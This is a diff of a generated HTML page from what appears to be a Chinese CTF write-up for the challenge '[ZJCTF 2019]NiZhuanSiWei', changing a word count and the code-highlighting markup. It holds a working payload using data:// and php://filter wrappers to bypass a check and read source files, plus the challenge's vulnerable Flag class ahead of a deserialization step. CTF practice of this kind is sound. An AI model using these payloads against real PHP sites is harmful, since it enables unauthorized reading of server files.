@@ -200,7 +200,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      280 字
+      272 字
     </span>
   
 
@@ -255,19 +255,19 @@
             <div class="markdown-body">
               <h2 id="十九、"><a href="#十九、" class="headerlink" title="十九、"></a>十九、</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>[ZJCTF 2019]NiZhuanSiWei<br><img src="https://ftp.bmp.ovh/imgs/2021/02/6451d712fe5dcc0a.png" srcset="/img/loading.gif">      </p>
 <h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>传一个<code>$text</code>要其等于<code>welcome to the zjctf</code>这里用的<code>file_get_contents函数</code><br>可以用<code>data://text/plain;base64,</code>伪协议传入<br>下面file中过滤了flag，看来不能用<code>php://filter</code>伪协议读取<code>flag.php</code>了，但可以读取<code>useless.php</code>看看有什么<br>payload：<code>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</code></p>
-<pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  
+<pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  
 
-<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;  <span class="hljs-comment">//flag.php  </span>
-    <span class="hljs-keyword">public</span> $file;  
-    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;  
-        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;file))&#123;  
-            <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-keyword">$this</span>-&gt;file); 
-            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;
-        <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);
-        &#125;  
-    &#125;  
-&#125;  
-<span class="hljs-meta">?&gt;</span></code></pre></code></pre>
+<span class="token keyword">class</span> <span class="token class-name">Flag</span><span class="token punctuation">&#123;</span>  <span class="token comment">//flag.php  </span>
+    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>  
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__tostring</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  
+            <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token double-quoted-string string">"U R SO CLOSE !///COME ON PLZ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>  
+    <span class="token punctuation">&#125;</span>  
+<span class="token punctuation">&#125;</span>  
+<span class="token delimiter important">?></span></span>      </code></pre></code></pre>
 <p><code>__tostring</code>方法当对象被当作字符串echo是自动执行<br>所以可以利用上面的password得到flag<br>先序列化        </p>
 <pre><code>```php
 &lt;?php  
